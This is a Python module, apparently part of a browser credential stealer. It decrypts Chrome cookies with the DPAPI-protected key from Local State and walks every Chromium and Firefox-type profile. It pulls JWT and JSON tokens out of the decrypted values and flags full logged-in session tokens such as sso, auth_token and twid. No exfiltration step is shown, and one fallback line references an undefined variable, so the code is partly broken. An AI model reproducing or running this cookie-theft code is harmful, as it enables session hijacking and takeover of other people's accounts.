import os
import json
import base64
import sqlite3
import shutil
import re
import configparser
import win32crypt
from Cryptodome.Cipher import AES

def get_encryption_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:] # Remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_cookie(encrypted_value, key):
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
        return raw.decode('utf-8', errors='ignore') # Fallback
    except:
        return b""

def clean_decrypted_value(raw):
    """Aggressively strip binary prefixes from decrypted Chrome cookies."""
    if isinstance(raw, str): return raw.strip()
    
    # 1. Anchor Search: JWT (sso, sso-rw)
    jwt_match = re.search(b'(eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)', raw)
    if jwt_match:
        return jwt_match.group(1).decode('utf-8')

    # 2. Anchor Search: JSON
    json_match = re.search(b'({.*})|(%7B.*%7D)', raw)
    if json_match:
        try:
            val = json_match.group(0).decode('utf-8', errors='ignore').split('\x00')[0].strip()
            if len(val) > 10: return val
        except: pass

    # 3. Robust Sequence Search
    match = re.search(b'[a-zA-Z0-9]{5,}[ -~]{10,}', raw)
    if match:
        return match.group(0).decode('utf-8', errors='ignore').split('\x00')[0].strip()
                    
    return raw.decode('utf-8', errors='ignore').split('\x00')[0].strip()

def get_chromium_profiles(user_data_dir):
    """Detect all profiles in a Chromium user data directory."""
    if not os.path.exists(user_data_dir): return []
    try:
        return ["Default"] + [d for d in os.listdir(user_data_dir) if d.startswith("Profile ")]
    except:
        return []

def get_gecko_profiles(app_data_dir):
    """Detect all profiles for Gecko-based browsers."""
    if not os.path.exists(app_data_dir): return []
    profiles_ini = os.path.join(app_data_dir, "profiles.ini")
    if not os.path.exists(profiles_ini): return []
    
    config = configparser.ConfigParser()
    config.read(profiles_ini)
    
    paths = []
    for section in config.sections():
        if "Path" in config[section]:
            path = config[section]["Path"]
            if config[section].get("IsRelative") == "1":
                paths.append(os.path.join(app_data_dir, path))
            else:
                paths.append(path)
    return paths

def is_logged_in_token(name, value):
    """Detect if the sso token is a full logged-in session."""
    if name not in ["sso", "sso-rw", "auth_token", "twid"]: return False
    if len(value) < 160: return False
    try:
        if "eyJ" in value:
            parts = value.split('.')
            if len(parts) >= 2:
                padding = '=' * (4 - len(parts[1]) % 4)
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + padding))
                return any(k in payload for k in ["id", "user_id", "email", "sub", "u"])
        elif name == "auth_token" and len(value) > 30:
            return True
    except: pass
    return False
